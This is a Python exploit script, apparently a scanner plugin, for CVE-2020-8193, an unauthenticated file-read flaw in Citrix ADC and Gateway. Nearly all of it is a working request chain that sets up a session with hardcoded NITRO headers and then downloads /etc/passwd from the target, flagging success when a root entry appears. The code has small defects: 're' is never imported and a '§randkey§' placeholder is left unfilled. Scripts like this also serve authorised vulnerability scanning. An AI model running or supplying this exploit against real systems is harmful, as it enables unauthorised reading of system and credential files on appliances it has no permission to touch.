import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Citrix unauthenticated LFI''',
        "description": '''Improper access control in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows unauthenticated access to certain URL endpoints.''',
        "severity": "medium",
        "references": [
            "https://github.com/jas502n/CVE-2020-8193", 
            "http://packetstormsecurity.com/files/160047/Citrix-ADC-NetScaler-Local-File-Inclusion.html"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-8193",
            "cwe-id": "CWE-862"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "citrix", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1"""
        method = "POST"
        data = """<appfwprofile><login></login></appfwprofile>"""
        headers = {'Content-Type': 'application/xml', 'X-NITRO-USER': 'xpyZxwy6', 'X-NITRO-PASS': 'xWXHUJ56'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/menu/ss?sid=nsroot&username=nsroot&force_setup=1"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/menu/neo"""
        method = "GET"
        data = """"""
        headers = {}
        resp2 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/menu/stc"""
        method = "GET"
        data = """"""
        headers = {}
        resp3 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1"""
        method = "POST"
        data = """<appfwprofile><login></login></appfwprofile>"""
        headers = {'Content-Type': 'application/xml', 'X-NITRO-USER': 'oY39DXzQ', 'X-NITRO-PASS': 'ZuU9Y9c1', 'rand_key': '§randkey§'}
        resp4 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/rapi/filedownload?filter=path:%2Fetc%2Fpasswd"""
        method = "POST"
        data = """<clipermission></clipermission>"""
        headers = {'Content-Type': 'application/xml', 'X-NITRO-USER': 'oY39DXzQ', 'X-NITRO-PASS': 'ZuU9Y9c1', 'rand_key': '§randkey§'}
        resp5 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp5.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url